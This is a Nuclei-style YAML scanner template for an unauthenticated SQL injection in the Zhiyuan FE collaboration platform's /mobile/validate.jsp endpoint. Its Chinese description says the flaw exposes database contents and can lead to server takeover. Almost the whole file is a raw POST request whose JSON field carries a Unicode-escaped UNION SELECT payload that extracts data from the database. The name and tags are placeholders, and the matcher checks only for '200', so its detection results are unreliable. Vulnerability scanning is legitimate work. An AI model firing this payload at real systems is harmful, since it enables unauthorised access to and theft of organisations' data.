id: FE-validate-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 致远互联FE协作办公平台 editflow_manager.js、validate.jsp等接口处存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/Z2-3%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-FE-%E7%A7%BB%E5%8A%A8%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-SQL?id=z2-3%e8%87%b4%e8%bf%9c%e4%ba%92%e8%81%94-fe-%e7%a7%bb%e5%8a%a8%e5%8d%8f%e4%bd%9c%e5%b9%b3%e5%8f%b0-sql
  tags: tags
http:
  - raw:
      - |-
        POST /mobile/validate.jsp;; HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Length: 309

        json={"type":"0","relId":"\u0031\u0027\u0020\u0061\u006E\u0064\u0020\u0031\u003D\u0032\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0031\u002C\u0032\u002C\u0075\u0073\u0065\u0072\u0020\u0066\u0072\u006F\u006D\u0020\u0046\u0041\u0043\u0045\u005F\u0056\u002D\u002D%2520"}
    matchers:
      - type: word
        part: header
        words:
          - '200'
#SQL语句需要Unicode 中文编码